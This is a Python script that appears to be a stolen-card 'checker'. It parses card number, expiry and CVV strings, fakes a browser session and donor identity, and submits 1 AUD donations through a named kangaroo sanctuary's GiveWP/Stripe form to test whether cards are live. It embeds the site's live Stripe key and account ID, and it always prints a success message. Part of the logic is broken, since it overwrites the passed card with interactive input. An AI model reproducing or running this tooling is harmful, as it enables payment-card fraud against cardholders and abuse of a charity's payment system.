
import asyncio

async def stripe_charge(data):
    try:
        cc = data.get("cc")
        if not cc:
            return {"error": "Missing cc"}
        cc, mes, ano, cvv = cc.split("|")

        # Begin original logic
        import requests, uuid, random, json
        from faker import Faker
        
        faker = Faker('en_US')
        
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        mail = faker.email()
        name = faker.first_name() + ' ' + faker.last_name()
        
        card = input("Cc: ")
        card = card.split('|')
        cc = card[0]
        mes = card[1]
        ano = card[2]
        cvv = card[3]
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://kangaroosanctuary.com',
            'priority': 'u=1, i',
            'referer': 'https://kangaroosanctuary.com/?givewp-route=donation-form-view&form-id=8744&locale=en_AU',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }
        
        params = {
            'givewp-route': 'donate',
            'givewp-route-signature': 'f979804874fcaf77a93acf070de4dd37',
            'givewp-route-signature-id': 'givewp-donate',
            'givewp-route-signature-expiration': '1746357525',
        }
        
        data = {
            'amount': '1',
            'currency': 'AUD',
            'donationType': 'single',
            'subscriptionPeriod': 'one-time',
            'subscriptionFrequency': '1',
            'subscriptionInstallments': '0',
            'formId': '8744',
            'enableTribute': 'show',
            'tributeType': 'In honor of',
            'tributesSendNotification': 'send',
            'gatewayId': 'stripe_payment_element',
            'firstName': 'jyrgtfhyy',
            'lastName': 'tbrfgxcvb',
            'email': 'BridgetSchultz1241@gmail.com',
            'anonymous': 'false',
            'tributeFirstName': 'jyrgtfhyy',
            'tributeLastName': 'tbrfgxcvb',
            'tributeRecipientFirstName': 'jyrgtfhyy',
            'tributeRecipientLastName': 'tbrfgxcvb',
            'tributesNotificationEmail': 'brigdetschuk@gmail.com',
            'tributesNotificationMessage': '',
            'donationBirthday': '',
            'originUrl': 'https://kangaroosanctuary.com/donate/',
            'isEmbed': 'true',
            'embedId': 'give-form-shortcode-1',
            'locale': 'en_AU',
            'gatewayData[stripePaymentMethod]': 'card',
            'gatewayData[stripePaymentMethodIsCreditCard]': 'true',
            'gatewayData[formId]': '8744',
            'gatewayData[stripeKey]': 'pk_live_51QMjHxHb39nwWwn7SJNOoEBQubrdyfh3wpriVFqGytkOZRcGbkeD66fErQtL7lsh9bY3Yi1ONwfaDTRtvqBZEFPG00FjWKbDB9',
            'gatewayData[stripeConnectedAccountId]': 'acct_1QMjHxHb39nwWwn7',
        }
        
        cookies = {
            '__stripe_mid': guid,
            '__stripe_sid': sid,
        }
        
        response = requests.post('https://kangaroosanctuary.com/', params=params, headers=headers,cookies=cookies, data=data)
        cl1 = response.json()['data']['clientSecret']
        cl2 = cl1.split('_secret_')[0]
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        }
        
        data = f'return_url=https%3A%2F%2Fkangaroosanctuary.com%2Fdonate%2F%3Fgivewp-event%3Ddonation-completed%26givewp-listener%3Dshow-donation-confirmation-receipt%26givewp-receipt-id%3D559458cd35af2769d698376898305b19%26givewp-embed-id%3Dgive-form-shortcode-1&payment_method_data[billing_details][name]=jyrgtfhyy+tbrfgxcvb&payment_method_data[billing_details][email]=BridgetSchultz1241%40gmail.com&payment_method_data[billing_details][address][country]=IN&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[payment_user_agent]=stripe.js%2Fca98f11090%3B+stripe-js-v3%2Fca98f11090%3B+payment-element%3B+deferred-intent%3B+autopm&payment_method_data[referrer]=https%3A%2F%2Fkangaroosanctuary.com&payment_method_data[time_on_page]=1043066&payment_method_data[client_attribution_metadata][client_session_id]=b4ad9f52-6468-4823-9ff8-5d4fde355f1e&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=automatic&payment_method_data[guid]=5ba5907f-781b-4a07-8fba-78a4ccf1972a0aaeed&payment_method_data[muid]=2d02de79-48fd-4659-aec0-7ddd289e03a944c51a&payment_method_data[sid]=23797b75-71f8-4077-86c7-d4f1abb54367e5a2f2&expected_payment_method_type=card&client_context[currency]=aud&client_context[mode]=payment&use_stripe_sdk=true&key=pk_live_51QMjHxHb39nwWwn7SJNOoEBQubrdyfh3wpriVFqGytkOZRcGbkeD66fErQtL7lsh9bY3Yi1ONwfaDTRtvqBZEFPG00FjWKbDB9&_stripe_account=acct_1QMjHxHb39nwWwn7&client_secret={cl1}'
        
        response = requests.post(
            f'https://api.stripe.com/v1/payment_intents/{cl2}/confirm',
            headers=headers,
            data=data,
        )
        
        # parse response
        #  let me get snippet
        response_json = response.json()
        
        if 'error' in response_json:
        
            error = response_json['error']
            message = error.get('message', 'No error message provided')
            print(f"Message: {message}")
        else:
            print(response_json)
        
            pass
        
        # api made by @kiltes
        # End logic

        return {"status": "success", "message": "✅ Check Complete"}
    except Exception as e:
        return {"status": "error", "message": str(e)}
